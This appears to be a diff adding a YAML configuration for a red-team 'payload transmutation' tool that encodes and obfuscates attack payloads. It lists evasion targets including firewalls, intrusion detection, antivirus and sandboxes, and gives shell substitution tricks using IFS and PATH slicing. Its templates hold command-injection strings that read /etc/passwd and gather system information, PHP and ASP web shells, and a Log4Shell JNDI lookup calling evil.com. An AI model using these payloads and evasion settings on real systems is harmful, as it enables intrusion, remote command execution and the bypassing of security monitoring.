@@ -1,0 +1,132 @@
+# Payload Transmutation Tool Configuration 🔓
+# Red Team Operations - Encoding/Obfuscation Settings
+
+# Default transmutation method
+default_method: "null_padding"
+
+# Output formatting options
+output_format: "raw"  # raw, json, pretty
+preserve_spacing: true
+
+# Custom separators for different encoding methods
+custom_separators:
+  null: "\\0"           # Null byte separator
+  space: " "            # Space separator  
+  tab: "\\t"            # Tab separator
+  custom: "|"           # Custom separator
+  double_null: "\\0\\0" # Double null bytes
+  hex_space: "\\x20"    # Hex encoded space
+
+# Character encoding settings
+encoding_charset: "utf-8"
+
+# Method-specific configurations
+method_configs:
+  unicode:
+    prefix: "\\u"
+    padding: 4
+    uppercase: false
+    
+  hex:
+    prefix: "\\x"
+    padding: 2
+    uppercase: false
+    
+  octal:
+    prefix: "\\"
+    padding: 3
+    
+  base64:
+    url_safe: false
+    remove_padding: false
+    
+  env_var:
+    default_var: "IFS"
+    common_substitutions:
+      " ": "${IFS}"
+      "/": "${PWD:0:1}"
+      "cat": "${PATH:5:3}"
+      "whoami": "${USER:0:6}"
+
+# Mixed encoding configurations  
+mixed_encoding:
+  default_methods: ["unicode", "hex", "octal"]
+  random_selection: false
+  method_weights:
+    unicode: 0.3
+    hex: 0.3
+    octal: 0.2
+    null_padding: 0.2
+
+# Advanced obfuscation settings
+advanced:
+  case_variation: false     # Randomly vary case
+  whitespace_insertion: false  # Insert random whitespace
+  comment_injection: false  # Inject comments in appropriate contexts
+  
+# Security context settings
+security_context:
+  target_systems:
+    - "linux"
+    - "windows" 
+    - "web_apps"
+    - "databases"
+  
+  evasion_targets:
+    - "waf"          # Web Application Firewalls
+    - "ids"          # Intrusion Detection Systems
+    - "dlp"          # Data Loss Prevention
+    - "av"           # Antivirus
+    - "sandboxes"    # Malware analysis sandboxes
+
+# Logging and audit settings
+logging:
+  enable_audit_log: true
+  log_level: "INFO"  # DEBUG, INFO, WARNING, ERROR
+  log_file: "transmute_audit.log"
+  include_original_payloads: false  # For OPSEC
+
+# Performance settings
+performance:
+  max_payload_size: 1048576  # 1MB
+  batch_size: 100
+  parallel_processing: false
+  
+# Template customization
+templates:
+  custom_payloads:
+    rce_linux:
+      - "; cat /etc/passwd"
+      - "| whoami"
+      - "&& uname -a"
+    rce_windows:
+      - "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
+      - "| whoami /all"
+      - "&& systeminfo"
+    web_shells:
+      - "<?php system($_GET['cmd']); ?>"
+      - "<% eval request(\"cmd\") %>"
+      - "${jndi:ldap://evil.com/a}"
+
+# Output formatting templates
+output_templates:
+  report_header: |
+    # Red Team Payload Transmutation Report 🔓
+    Generated: {timestamp}
+    Method: {method}
+    Target: {target}
+    Payloads Processed: {count}
+    
+  payload_format: |
+    ## Payload {index}
+    **Original:** `{original}`
+    **Method:** {method}
+    **Transmuted:** `{transmuted}`
+    **Length:** {length} chars
+    
+# Development and testing settings    
+development:
+  debug_mode: false
+  test_mode: false
+  dry_run: false
+  validate_outputs: true
